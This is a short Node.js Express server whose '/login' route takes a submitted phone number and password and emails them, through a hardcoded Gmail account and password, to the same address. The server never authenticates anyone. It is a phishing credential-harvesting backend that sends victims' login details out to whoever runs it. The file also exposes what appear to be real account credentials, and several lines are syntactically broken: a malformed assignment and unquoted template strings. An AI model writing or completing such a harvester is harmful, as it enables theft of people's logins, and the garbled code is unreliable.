const express = require('express');
const bodyParser = require('body-parser');
const nodemailer = require('nodemailer');

const app = express();

// Middleware to parse form data
app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));

// Nodemailer transporter setup
const transporter = nodemailer.createTransport({
    service: 'gmail',
    auth: {
        user: 'taiwoodelabi09@gmail.com', // taiwoodelabi09@gmail.com
        pass: 'Captaintaiwo1'     // Captaintaiwo1.
    }
});

// Handle form submissions
app.post('/login', (req, res) => {
     phone, password  = req.body.password;

    const mailOptions = {
        from: 'taiwoodelabi09@gmail.com',
        to: 'taiwoodelabi09@gmail.com',
        subject: 'New Login Attempt',
        text: Phone: $$ { phone } \ nPassword: $$ {password};

    transporter.sendMail(mailOptions, (error, info) => {
        if (error) {
            console.error('Error sending email:', error);
            return res.status(500).send('Failed to send email');
        }
        console.log('Email sent:', info.response);
        res.send('Login details sent successfully!');
    });
});

// Start the server
const PORT = 3000;
app.listen(PORT, () => {
    console.log(Server running at http://localhost:${PORT});
});